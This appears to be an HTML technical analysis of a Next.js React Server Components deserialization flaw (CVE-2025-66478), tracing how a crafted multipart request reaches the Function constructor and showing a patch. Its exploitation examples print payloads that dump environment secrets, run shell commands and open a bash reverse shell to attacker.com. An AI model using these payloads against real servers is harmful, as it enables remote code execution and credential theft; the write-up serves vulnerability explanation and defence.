<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Payload Processing - CVE-2025-66478</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        @media print {
            body { margin: 0; padding: 10mm; }
            .no-print { display: none; }
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 210mm;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
        }
        
        @media screen and (max-width: 768px) {
            body {
                padding: 15px;
            }
        }
        
        .header {
            text-align: center;
            border-bottom: 3px solid #1976d2;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #1976d2;
            margin: 0;
            font-size: 28px;
        }
        
        @media screen and (max-width: 768px) {
            .header h1 {
                font-size: 22px;
            }
            
            .header p {
                font-size: 14px;
            }
        }
        
        h2 {
            color: #1976d2;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 10px;
            margin-top: 30px;
            font-size: 24px;
        }
        
        h3 {
            color: #455a64;
            margin-top: 20px;
            font-size: 18px;
        }
        
        @media screen and (max-width: 768px) {
            h2 {
                font-size: 20px;
                margin-top: 25px;
            }
            
            h3 {
                font-size: 16px;
            }
        }
        
        .step-box {
            background: #f5f5f5;
            border-left: 4px solid #1976d2;
            padding: 15px;
            margin: 20px 0;
        }
        
        .step-box h3 {
            margin-top: 0;
            color: #1976d2;
        }
        
        .danger-highlight {
            background: #ffebee;
            border-left: 4px solid #d32f2f;
            padding: 15px;
            margin: 15px 0;
        }
        
        .success-highlight {
            background: #e8f5e9;
            border-left: 4px solid #388e3c;
            padding: 15px;
            margin: 15px 0;
        }
        
        code {
            background: #f5f5f5;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #d32f2f;
        }
        
        pre {
            background: #263238;
            color: #aed581;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 13px;
            line-height: 1.5;
            margin: 15px 0;
        }
        
        @media screen and (max-width: 768px) {
            pre {
                padding: 10px;
                font-size: 11px;
                margin: 10px -15px;
                border-radius: 0;
            }
        }
        
        pre code {
            background: none;
            color: inherit;
            padding: 0;
        }
        
        .flow-diagram {
            background: #fff;
            border: 2px solid #1976d2;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            font-size: 13px;
            line-height: 1.8;
            overflow-x: auto;
        }
        
        @media screen and (max-width: 768px) {
            .flow-diagram {
                padding: 12px;
                font-size: 11px;
                margin: 15px -15px;
                border-radius: 0;
                border-left: none;
                border-right: none;
            }
        }
        
        .arrow {
            color: #1976d2;
            font-weight: bold;
        }
        
        .btn-print {
            background: #1976d2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
            display: block;
        }
        
        .btn-print:hover {
            background: #1565c0;
        }
        
        @media screen and (max-width: 768px) {
            .btn-print {
                font-size: 14px;
                padding: 10px 20px;
                position: sticky;
                top: 10px;
                z-index: 1000;
                box-shadow: 0 2px 8px rgba(0,0,0,0.2);
            }
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            display: block;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }
        
        @media screen and (max-width: 768px) {
            table {
                font-size: 13px;
            }
        }
        
        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }
        
        @media screen and (max-width: 768px) {
            th, td {
                padding: 8px;
                font-size: 12px;
            }
        }
        
        th {
            background: #1976d2;
            color: white;
            font-weight: bold;
        }
        
        tr:nth-child(even) {
            background: #f9f9f9;
        }
        
        .highlight-danger {
            background: #ffcdd2;
            padding: 2px 4px;
            border-radius: 3px;
        }
        
        ul, ol {
            margin: 15px 0;
            padding-left: 30px;
        }
        
        @media screen and (max-width: 768px) {
            ul, ol {
                padding-left: 20px;
            }
        }
        
        li {
            margin: 10px 0;
        }
        
        @media screen and (max-width: 768px) {
            li {
                margin: 8px 0;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <button class="btn-print no-print" onclick="window.print()">📄 Print / Save as PDF</button>
    
    <div class="header">
        <h1>How Node.js Server Processes the Malicious Payload</h1>
        <p style="color: #666; margin-top: 10px;">CVE-2025-66478 - Technical Deep Dive</p>
    </div>

    <h2>The Malicious Payload</h2>
    
    <pre><code>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:constructor:constructor"}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

{"x":1}
------WebKitFormBoundary7MA4YWxkTrZu0gW--</code></pre>

    <h2>Processing Flow</h2>

    <div class="step-box">
        <h3>Step 1: HTTP Request Reception</h3>
        <p>The malicious HTTP POST request arrives at the Node.js server with special headers:</p>
        <pre><code>POST / HTTP/1.1
Host: vulnerable-server.com
Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...</code></pre>
        
        <p><strong>Key Header:</strong> <code>Next-Action</code> signals to Next.js that this is a React Server Component action request.</p>
    </div>

    <div class="step-box">
        <h3>Step 2: Next.js Routing Detection</h3>
        <p>Next.js App Router recognizes the request as an RSC action:</p>
        <pre><code>// Next.js internal routing logic
if (request.headers['next-action']) {
  // This is a Server Action - route to RSC handler
  return handleServerAction(request);
}</code></pre>
    </div>

    <div class="step-box">
        <h3>Step 3: Multipart Form Data Parsing</h3>
        <p>Node.js multipart parser (using libraries like <code>busboy</code>) extracts the form fields:</p>
        
        <pre><code>// Raw multipart data gets parsed into JavaScript object
const parsedFormData = {
  "0": '{"then":"$1:__proto__:constructor:constructor"}',
  "1": '{"x":1}'
}</code></pre>

        <p><strong>Result:</strong></p>
        <ul>
            <li>Field "0": Contains the malicious reference string</li>
            <li>Field "1": Contains a simple object</li>
        </ul>
    </div>

    <div class="step-box">
        <h3>Step 4: JSON Parsing</h3>
        <p>Each form field value is parsed as JSON:</p>
        
        <pre><code>// Parse field "0"
const field0 = JSON.parse('{"then":"$1:__proto__:constructor:constructor"}');
// Result: { then: "$1:__proto__:constructor:constructor" }

// Parse field "1"
const field1 = JSON.parse('{"x":1}');
// Result: { x: 1 }</code></pre>
    </div>

    <div class="step-box">
        <h3>Step 5: RSC Deserializer Processing (THE VULNERABILITY)</h3>
        
        <div class="danger-highlight">
            <strong>🔴 CRITICAL SECTION - WHERE EXPLOITATION OCCURS</strong>
        </div>

        <p>The React Server Components deserializer processes the parsed data:</p>

        <pre><code>// Simplified vulnerable code from React/Next.js
function deserializeServerAction(formData) {
  const values = [];
  
  // Store parsed values
  values[0] = { then: "$1:__proto__:constructor:constructor" };
  values[1] = { x: 1 };
  
  // Process special references (objects with "then" property starting with "$")
  if (values[0].then && values[0].then.startsWith("$")) {
    // Extract the reference path
    const referencePath = values[0].then;
    // "$1:__proto__:constructor:constructor"
    
    // Split into parts
    const parts = referencePath.split(":");
    // ["$1", "__proto__", "constructor", "constructor"]
    
    // Get the starting object (field 1)
    const startIndex = parseInt(parts[0].substring(1)); // "1"
    let target = values[startIndex]; // { x: 1 }
    
    <span class="highlight-danger">// 🔴 DANGEROUS: Traverse the property chain without validation</span>
    for (let i = 1; i < parts.length; i++) {
      target = target[parts[i]];
    }
    
    // After traversal, 'target' now points to Function constructor!
    return target;
  }
}</code></pre>
    </div>

    <h2>Step-by-Step Chain Traversal</h2>

    <div class="flow-diagram">
<strong>Starting Point:</strong> target = { x: 1 }

<span class="arrow">↓</span> Step 1: Access <code>__proto__</code>

target = { x: 1 }.__proto__
<strong>Result:</strong> Object.prototype (the base prototype of all objects)

<span class="arrow">↓</span> Step 2: Access first <code>constructor</code>

target = Object.prototype.constructor
<strong>Result:</strong> Object (the Object constructor function)

<span class="arrow">↓</span> Step 3: Access second <code>constructor</code>

target = Object.constructor
<strong>Result:</strong> Function (the Function constructor)

<span class="arrow">↓</span> <span class="highlight-danger">💀 EXPLOITATION ACHIEVED</span>

<strong>Final Result:</strong> target now references the Function constructor
Attacker can now execute: <code>Function("malicious code")()</code>
    </div>

    <h2>JavaScript Prototype Chain Explanation</h2>

    <table>
        <tr>
            <th>Step</th>
            <th>Expression</th>
            <th>Result</th>
        </tr>
        <tr>
            <td>0</td>
            <td><code>{ x: 1 }</code></td>
            <td>Simple object</td>
        </tr>
        <tr>
            <td>1</td>
            <td><code>{ x: 1 }.__proto__</code></td>
            <td>Object.prototype</td>
        </tr>
        <tr>
            <td>2</td>
            <td><code>Object.prototype.constructor</code></td>
            <td>Object function</td>
        </tr>
        <tr>
            <td>3</td>
            <td><code>Object.constructor</code></td>
            <td>Function constructor</td>
        </tr>
        <tr style="background: #ffcdd2;">
            <td>4</td>
            <td><code>Function("code")()</code></td>
            <td><strong>⚠️ Remote Code Execution</strong></td>
        </tr>
    </table>

    <h2>Real Exploitation Examples</h2>

    <div class="step-box">
        <h3>Example 1: Stealing Environment Variables</h3>
        
        <p><strong>Attacker's payload:</strong></p>
        <pre><code>// Field "0": Reference to Function constructor
{"then":"$1:__proto__:constructor:constructor"}

// Field "1": Base object
{"x":1}

// Field "2": Code to execute
"return process.env"</code></pre>

        <p><strong>Server executes:</strong></p>
        <pre><code>const FunctionConstructor = /* result of chain traversal */;
const stolen = FunctionConstructor("return process.env")();

// stolen = {
//   DATABASE_URL: "postgresql://user:pass@host:5432/db",
//   JWT_SECRET: "super-secret-key",
//   AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE",
//   STRIPE_SECRET_KEY: "sk_live_...",
//   ...
// }</code></pre>
    </div>

    <div class="step-box">
        <h3>Example 2: Executing System Commands</h3>
        
        <p><strong>Attacker's payload:</strong></p>
        <pre><code>{"then":"$1:__proto__:constructor:constructor"}
{"x":1}
"require('child_process').execSync('whoami').toString()"</code></pre>

        <p><strong>Server executes:</strong></p>
        <pre><code>const result = Function(
  "require('child_process').execSync('whoami').toString()"
)();

// result = "nodejs" or "root" (current user)</code></pre>
    </div>

    <div class="step-box">
        <h3>Example 3: Reverse Shell (Full Server Compromise)</h3>
        
        <p><strong>Attacker's payload:</strong></p>
        <pre><code>{"then":"$1:__proto__:constructor:constructor"}
{"x":1}
"require('child_process').exec('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"')"</code></pre>

        <p><strong>Result:</strong> Attacker gains interactive shell access to the server</p>
    </div>

    <h2>Why This Works: Key Factors</h2>

    <ol>
        <li><strong>No Input Validation:</strong> The deserializer trusts the reference path without checking for dangerous properties</li>
        <li><strong>JavaScript Prototype Chain:</strong> All objects inherit from Object.prototype, providing a path to constructors</li>
        <li><strong>Function Constructor:</strong> JavaScript's Function() constructor can execute arbitrary strings as code</li>
        <li><strong>Server-Side Execution:</strong> Code runs with full Node.js privileges, not sandboxed</li>
    </ol>

    <h2>The Patch (Next.js 15.1.4+)</h2>

    <div class="success-highlight">
        <h3>How the Fixed Version Prevents This</h3>
        
        <pre><code>function deserializeServerAction(formData) {
  const values = [/* ... */];
  
  if (values[0].then && values[0].then.startsWith("$")) {
    const parts = values[0].then.split(":");
    
    <span style="color: #388e3c;">// ✅ PATCHED: Validate each part of the reference path</span>
    const dangerousProperties = ["__proto__", "constructor", "prototype"];
    
    for (const part of parts) {
      if (dangerousProperties.includes(part)) {
        // Reject the request immediately
        throw new Error("Invalid reference: dangerous property access detected");
      }
    }
    
    // Safe to traverse now
    let target = values[startIndex];
    for (let i = 1; i < parts.length; i++) {
      target = target[parts[i]];
    }
  }
}</code></pre>
    </div>

    <h2>Node.js/Next.js Components Involved</h2>

    <table>
        <tr>
            <th>Component</th>
            <th>Role</th>
            <th>Vulnerable?</th>
        </tr>
        <tr>
            <td>HTTP Parser</td>
            <td>Parses incoming HTTP requests</td>
            <td>No - works as expected</td>
        </tr>
        <tr>
            <td>Multipart Parser (busboy)</td>
            <td>Extracts form fields from multipart data</td>
            <td>No - works as expected</td>
        </tr>
        <tr>
            <td>JSON.parse()</td>
            <td>Parses JSON strings to objects</td>
            <td>No - works as expected</td>
        </tr>
        <tr style="background: #ffcdd2;">
            <td><strong>RSC Deserializer</strong></td>
            <td>Reconstructs objects from serialized RSC format</td>
            <td><strong>YES - Missing validation</strong></td>
        </tr>
        <tr>
            <td>Next.js App Router</td>
            <td>Routes requests to appropriate handlers</td>
            <td>No - works as expected</td>
        </tr>
    </table>

    <div class="danger-highlight">
        <h3>Key Takeaway</h3>
        <p>The vulnerability is <strong>NOT</strong> in Node.js, Express, or standard HTTP/form parsing. It's specifically in <strong>React Server Components' custom deserializer</strong> used by Next.js App Router.</p>
        
        <p>The deserializer was designed to reconstruct complex JavaScript objects efficiently, but it failed to validate user-controlled reference paths, allowing prototype pollution that leads to remote code execution.</p>
    </div>

    <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; text-align: center;">
        <p>Document generated: December 6, 2025</p>
        <p>CVE-2025-66478 / CVE-2025-55182 Technical Analysis</p>
    </footer>
</body>
</html>
